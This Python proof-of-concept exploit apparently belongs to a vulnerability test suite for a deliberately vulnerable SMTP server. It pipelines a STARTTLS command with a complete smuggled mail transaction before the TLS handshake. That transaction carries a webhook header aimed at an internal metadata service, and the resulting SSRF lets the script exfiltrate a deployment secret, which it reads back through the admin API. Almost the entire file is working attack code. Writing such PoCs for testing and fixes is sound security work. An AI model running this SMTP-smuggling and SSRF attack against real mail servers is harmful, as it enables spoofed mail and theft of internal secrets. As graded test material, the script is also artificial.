#!/usr/bin/env python3
"""
PoC #4: STARTTLS buffering bug -> bypasses a real, TLS-only trust check
------------------------------------------------------------------------------
Location: SmtpSession.drain() and onStartTls() in src/smtp.js. drain() pulls
every complete line currently sitting in `this.buffer` in a single pass and
dispatches each one, with NO early return when the line it just handled was
STARTTLS. onStartTls() sends the "220 Ready to start TLS" reply, sets
`this.tlsActive = true`, and wraps the raw socket in a tls.TLSSocket - but
never clears `this.buffer`. If a client (or a network attacker positioned to
inject bytes right after intercepting/relaying a STARTTLS command) pipelines
additional commands in the SAME TCP segment as STARTTLS - before any TLS
handshake has even begun - those commands are still sitting in `this.buffer`
and drain()'s loop keeps consuming them AFTER `this.tlsActive` has already
flipped to `true`, dispatching them as if they were sent over the connection
after it became "encrypted". This is the real, documented STARTTLS
command-injection / "SMTP smuggling" bug class (see e.g. CVE-2011-0411 and
the wider 2023 SMTP-smuggling research): the plaintext-before-TLS boundary
is not enforced.

What makes this a genuine security-relevant BYPASS, not just message-boundary
confusion: a whole transaction that arrived entirely in PLAINTEXT, before the
TLS handshake began, is accepted and acted on as if it had been sent over the
"encrypted" session - including its delivery-status callback (the
X-Notify-Webhook header honored by finishData(), VULN #8's sink). The
plaintext-before-TLS boundary that should make MTA discard those pre-handshake
bytes is not enforced, so an on-path attacker who splices commands in at the
STARTTLS boundary gets them executed with the session's post-handshake trust.

Deliberately decoupled from VULN #2: an EARLIER version of this PoC proved the
bypass by CRLF-injecting a hidden webhook through the AUTH= xtext - the exact
construction VULN #2 tests - so fixing #2 (rejecting decoded CR/LF) silently
made this PoC report "fixed" while the STARTTLS buffering bug was untouched.
This PoC now uses an ORDINARY, visible X-Notify-Webhook header in the smuggled
DATA (no CRLF trick at all), so its pass/fail turns on the buffering bug alone:
fixing #2 does not affect it, and fixing #4 (discard this.buffer at STARTTLS)
correctly makes it report fixed because the pre-handshake transaction - webhook
and all - is discarded instead of processed.

Simplification, stated honestly: a full demonstration needs a genuine
man-in-the-middle splicing bytes into someone else's plaintext connection at
exactly the STARTTLS boundary. This PoC instead plays both roles itself
(single TCP connection, single script) - it authenticates for real first
(plaintext AUTH is documented, ordinary behaviour - see README.md), then
pipelines a COMPLETE malicious transaction (STARTTLS + the forged MAIL FROM
+ RCPT TO + DATA + terminator) in one `sendall()`, all BEFORE performing its
own TLS handshake, then performs a real handshake and sends a second,
entirely separate, genuinely-encrypted transaction afterward. The underlying
bug fires identically either way - drain() does not care who queued the
pre-handshake bytes - only the "attacker relays into a victim's session"
framing is reduced to "attacker supplies both halves of one connection" for
a self-contained PoC. The TLS handshake itself, the STARTTLS buffering bug,
and the TLS-trust check it bypasses are all 100% real code, exercised over
the real network stack.

How this proves it: after both transactions complete, (a) the admin HTTP API
shows a queued message whose envelope-from is the SMUGGLED (pre-TLS) address,
proving the "encrypted" session processed plaintext commands from before the
handshake; and (b) the visible X-Notify-Webhook carried in that smuggled
DATA pointed MTA's delivery-status callback at the internal-only metadata
service, so MTA fetched it on our behalf and recorded this deployment's real
MTA_FLAG against the smuggled message - which we read back through the admin
API. That flag recovery is the scoreable impact and the pass/fail condition:
it proves the pre-handshake smuggling has real downstream effect (a disclosed
per-deployment secret). When the harness exports MTA_FLAG into this PoC's env,
the recovered value is asserted to match it exactly.

Run: python3 04_starttls_smuggling.py [host] [port] [admin_port] [metadata_url] [expected_flag]

Credentials (env, matching the vuln_tests compose fixture): MTA_TEST_AUTH_USER
/ MTA_TEST_AUTH_PASS, defaulting to "relay"/"relay123" if unset.
"""
import base64
import json
import os
import socket
import ssl
import sys
import time
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2525
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
INTERNAL_URL = sys.argv[4] if len(sys.argv) > 4 else "http://metadata:9000/secret/mta"
EXPECTED_FLAG = (sys.argv[5] if len(sys.argv) > 5
                 else os.environ.get("MTA_FLAG", "FLAG{local-dev-default}"))

AUTH_USER = os.environ.get("MTA_TEST_AUTH_USER", "relay")
AUTH_PASS = os.environ.get("MTA_TEST_AUTH_PASS", "relay123")


def drain(sock, timeout=1.0):
    sock.settimeout(timeout)
    chunks = b""
    try:
        while True:
            d = sock.recv(65536)
            if not d:
                break
            chunks += d
    except socket.timeout:
        pass
    return chunks


def main():
    token = uuid.uuid4().hex[:10]
    smuggled_from = f"smuggled-{token}@attacker.example"
    legit_from = f"legit-{token}@example.com"
    victim_rcpt = f"victim-{token}@mta.local"

    sock = socket.create_connection((HOST, PORT), timeout=10)
    drain(sock, 2)  # banner
    sock.sendall(b"EHLO poc.example\r\n")
    drain(sock, 2)

    # A REAL, completed AUTH - plaintext, which is ordinary documented
    # behaviour (README.md doesn't require TLS first for AUTH). This sets
    # this.authenticated = true on the session, which is what actually lets
    # the forged webhook fire later (a separate gate from this.tlsActive).
    creds = base64.b64encode(f"\0{AUTH_USER}\0{AUTH_PASS}".encode()).decode()
    sock.sendall(f"AUTH PLAIN {creds}\r\n".encode())
    auth_reply = drain(sock, 3)
    if b"235" not in auth_reply:
        print(f"[-] Could not authenticate: {auth_reply!r}")
        return 1
    print("[*] Authenticated for real, in plaintext (ordinary documented behaviour)")

    # Everything below is sent in ONE write, all BEFORE the TLS handshake
    # begins - this is the "already sitting in this.buffer" pre-handshake
    # data the bug fails to discard.
    # The smuggled DATA carries an ordinary, VISIBLE X-Notify-Webhook header
    # (no CRLF-injection trick - that's VULN #2's territory, deliberately not
    # used here) pointed at the internal-only metadata service. finishData()
    # honours it because the session is authenticated (the real plaintext AUTH
    # above); the bug under test is that this whole transaction was processed
    # even though every byte arrived BEFORE the TLS handshake began.
    injected = (
        b"STARTTLS\r\n"
        b"MAIL FROM:<" + smuggled_from.encode() + b">\r\n"
        b"RCPT TO:<" + victim_rcpt.encode() + b">\r\n"
        b"DATA\r\n"
        b"Subject: smuggled\r\n"
        b"X-Notify-Webhook: " + INTERNAL_URL.encode() + b"\r\n"
        b"\r\n"
        b"This message was smuggled in before the TLS handshake began.\r\n"
        b".\r\n"
    )
    sock.sendall(injected)
    # Only the STARTTLS reply itself (sent in plaintext, before the socket is
    # swapped) can arrive before the handshake - everything the server
    # already queued up in response to the smuggled MAIL FROM/RCPT TO/DATA
    # lines was written to the NEW (TLS) socket object, so it won't actually
    # hit the wire until the handshake completes and flushes it.
    pre_tls_replies = drain(sock, 1.0)
    print(f"[*] Replies observed before any TLS handshake began:\n    {pre_tls_replies!r}")
    if b"220" not in pre_tls_replies:
        print("[-] Did not even get the STARTTLS reply - aborting")
        return 1

    # NOW perform the real TLS handshake - the legitimate continuation of
    # this same connection.
    ctx = ssl._create_unverified_context()
    try:
        tls_sock = ctx.wrap_socket(sock, server_hostname=HOST)
    except ssl.SSLError as e:
        print(f"[-] TLS handshake failed: {e}")
        return 1
    print(f"[*] TLS handshake succeeded ({tls_sock.version()})")

    post_handshake_flush = drain(tls_sock, 1.5)
    print(f"[*] Encrypted bytes that flushed IMMEDIATELY after the handshake, before we sent anything:\n"
          f"    {post_handshake_flush!r}")
    if b"queued as" not in post_handshake_flush:
        print("[-] The pre-TLS smuggled transaction's replies never flushed - buffering bug may be fixed")
        return 1
    print("[+] Confirmed: the server processed and replied to the smuggled MAIL FROM/RCPT TO/DATA "
          "BEFORE the TLS handshake even began.")

    # A second, completely ordinary, fully-encrypted transaction, for
    # contrast with the smuggled one above.
    tls_sock.sendall(f"MAIL FROM:<{legit_from}>\r\n".encode())
    drain(tls_sock, 1)
    tls_sock.sendall(f"RCPT TO:<{victim_rcpt}>\r\n".encode())
    drain(tls_sock, 1)
    tls_sock.sendall(b"DATA\r\n")
    drain(tls_sock, 1)
    tls_sock.sendall(b"Subject: legit\r\n\r\nThis is the real encrypted message.\r\n.\r\n")
    final = drain(tls_sock, 1.5)
    print(f"[*] Encrypted-session transaction reply: {final!r}")
    tls_sock.close()

    time.sleep(1)
    entries = json.loads(urllib.request.urlopen(f"http://{HOST}:{ADMIN_PORT}/queue", timeout=10).read())
    smuggled_entry = next((e for e in entries if e["from"] == smuggled_from and victim_rcpt in e["to"]), None)
    legit_present = any(e["from"] == legit_from and victim_rcpt in e["to"] for e in entries)

    if not smuggled_entry or not legit_present:
        print(f"[-] Expected both messages queued (smuggled={bool(smuggled_entry)}, legit={legit_present})")
        return 1
    print(f"[+] Confirmed: a message from '{smuggled_from}' - sent entirely in PLAINTEXT before the TLS "
          f"handshake even began - was queued as if it arrived over the encrypted session, alongside the "
          f"genuinely-encrypted '{legit_from}' message.")

    # SCORED: the visible X-Notify-Webhook carried in the smuggled pre-TLS DATA
    # pointed MTA's callback at the internal metadata service; its captured
    # response body carries the real MTA_FLAG. Read it back off the smuggled
    # message via the admin API.
    webhook_result = None
    for _ in range(20):
        detail = json.loads(
            urllib.request.urlopen(f"http://{HOST}:{ADMIN_PORT}/queue/{smuggled_entry['name']}", timeout=10).read()
        )
        webhook_result = detail.get("webhook")
        if webhook_result and webhook_result.get("body"):
            break
        time.sleep(0.5)

    if not webhook_result or not webhook_result.get("body"):
        print("[-] No webhook response body recorded - the smuggled pre-TLS callback did not fire "
              "(STARTTLS buffer discarded -> VULN #4 fixed)")
        return 1

    body = webhook_result.get("body", "")
    print(f"[*] Webhook response body MTA captured from the internal target: {body[:200]!r}")
    if EXPECTED_FLAG not in body:
        print(f"[-] expected flag {EXPECTED_FLAG!r} not present in the captured response; the SSRF "
              f"may be blocked, or MTA_FLAG doesn't match the running deployment")
        return 1

    print(f"[+] SCORED: a transaction smuggled entirely in PLAINTEXT before the TLS handshake fired its "
          f"visible X-Notify-Webhook against the internal-only metadata service and exfiltrated this "
          f"deployment's real secret {EXPECTED_FLAG!r} - purely by exploiting the STARTTLS buffering "
          f"bug (no CRLF trick, independent of VULN #2), with no genuine TLS handshake for the "
          f"malicious transaction.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
